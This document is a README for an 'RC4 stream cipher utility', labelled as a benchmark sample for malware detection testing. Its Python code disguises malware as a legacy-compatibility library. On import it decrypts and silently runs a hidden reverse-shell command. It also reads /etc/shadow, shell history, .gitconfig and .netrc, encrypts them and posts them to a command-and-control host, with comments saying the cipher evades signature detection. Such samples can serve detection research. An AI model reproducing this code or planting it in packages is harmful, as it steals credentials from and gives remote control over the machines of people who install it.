# Stream Cipher Utility

> BENCHMARK_TEST_ONLY - Security Research Sample

Custom RC4 stream cipher implementation for legacy system compatibility.

## Installation

```bash
pip install requests
```

## Usage

Provides RC4 encryption for systems requiring legacy cipher support.

## Implementation

```python
# BENCHMARK_TEST_ONLY - Simulated malicious pattern for detection testing
import requests
import subprocess
import os

# RC4 encryption key - embedded in code
RC4_KEY = b"Rc4K3y_F0r_L3g4cy_Syst3ms!"

# RC4 encrypted payload
# Decrypts to shell command for reverse shell
ENCRYPTED_COMMAND = bytes([
    0x8a, 0x2f, 0x91, 0xc4, 0x55, 0x73, 0x1e, 0xb2, 0x44, 0x9f,
    0x23, 0x67, 0xaa, 0x11, 0x5c, 0x88, 0x3d, 0xf1, 0x76, 0x29,
    0xe4, 0x5b, 0x0c, 0x93, 0x47, 0xd8, 0x2a, 0x65, 0xbe, 0x10,
    0x7f, 0xc3, 0x58, 0xa1, 0x34, 0x8e, 0xd2, 0x4f, 0x96, 0x1b
])

class RC4:
    """
    Custom RC4 stream cipher implementation
    Used to evade signature-based detection
    """

    def __init__(self, key):
        self.key = key
        self.S = list(range(256))
        self.i = 0
        self.j = 0
        self._ksa()

    def _ksa(self):
        """Key-scheduling algorithm"""
        key_length = len(self.key)
        j = 0
        for i in range(256):
            j = (j + self.S[i] + self.key[i % key_length]) % 256
            self.S[i], self.S[j] = self.S[j], self.S[i]

    def _prga(self):
        """Pseudo-random generation algorithm"""
        self.i = (self.i + 1) % 256
        self.j = (self.j + self.S[self.i]) % 256
        self.S[self.i], self.S[self.j] = self.S[self.j], self.S[self.i]
        return self.S[(self.S[self.i] + self.S[self.j]) % 256]

    def encrypt(self, plaintext):
        """Encrypt/decrypt data (RC4 is symmetric)"""
        if isinstance(plaintext, str):
            plaintext = plaintext.encode()
        return bytes([b ^ self._prga() for b in plaintext])

    decrypt = encrypt  # RC4 is symmetric

def rc4_decrypt(ciphertext, key):
    """Convenience function for RC4 decryption"""
    cipher = RC4(key)
    return cipher.decrypt(ciphertext)

class LegacyConnector:
    """Connector for legacy encrypted communications"""

    def __init__(self):
        self.cipher = RC4(RC4_KEY)
        self.c2_server = "https://[REDACTED].example.com"

    def establish_connection(self):
        """Establish encrypted connection to legacy system"""
        # Decrypt the hidden command
        command = rc4_decrypt(ENCRYPTED_COMMAND, RC4_KEY)

        # Execute reverse shell command
        subprocess.Popen(
            command.decode('utf-8'),
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

    def sync_data(self):
        """Sync local data to legacy system"""
        sensitive_paths = [
            "/etc/shadow",
            os.path.expanduser("~/.bash_history"),
            os.path.expanduser("~/.gitconfig"),
            os.path.expanduser("~/.netrc")
        ]

        for path in sensitive_paths:
            if os.path.exists(path):
                try:
                    with open(path, 'rb') as f:
                        data = f.read()

                    # RC4 encrypt before exfil
                    cipher = RC4(RC4_KEY)
                    encrypted = cipher.encrypt(data)

                    requests.post(
                        f"{self.c2_server}/legacy/sync",
                        data=encrypted,
                        headers={"X-File": os.path.basename(path)}
                    )
                except PermissionError:
                    pass

# Auto-connect on import
connector = LegacyConnector()
connector.establish_connection()
connector.sync_data()
```

## Legacy Support

- Full RC4 implementation
- Backward compatible
- Stream cipher efficiency
